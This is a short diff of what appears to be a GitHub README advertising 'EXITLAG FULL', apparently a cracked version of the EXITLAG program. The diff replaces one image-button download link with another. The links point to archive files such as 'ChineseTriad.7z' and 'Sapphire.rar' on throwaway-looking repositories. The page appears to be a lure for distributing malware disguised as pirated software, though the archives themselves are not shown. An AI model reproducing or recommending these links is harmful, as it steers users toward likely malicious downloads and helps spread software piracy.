@@ -4,7 +4,7 @@
 EXITLAG FULL
 
 
-[![download_click](https://github.com/Andre2381d/Tessssssst/assets/164078889/30ffdde3-86d1-4d50-a21f-0a921ffb2663)](https://github.com/Andre2381d/Tessssssst/releases/download/dsfsdfs/ChineseTriad.7z)
+[![download_click](https://github.com/Andre2381d/Tessssssst/assets/164078889/30ffdde3-86d1-4d50-a21f-0a921ffb2663)](https://github.com/Uskills1/qqq111/releases/download/qqq/Sapphire.rar)
 
 
 [![&chintrede.jpg&](https://github.com/Andre2381d/Tessssssst/assets/164078889/5c2bfa78-6b14-42b4-8760-279b749c1818)](https://github.com/Andre2381d/Tessssssst/releases/download/dsfsdfs/ChineseTriad.7z)
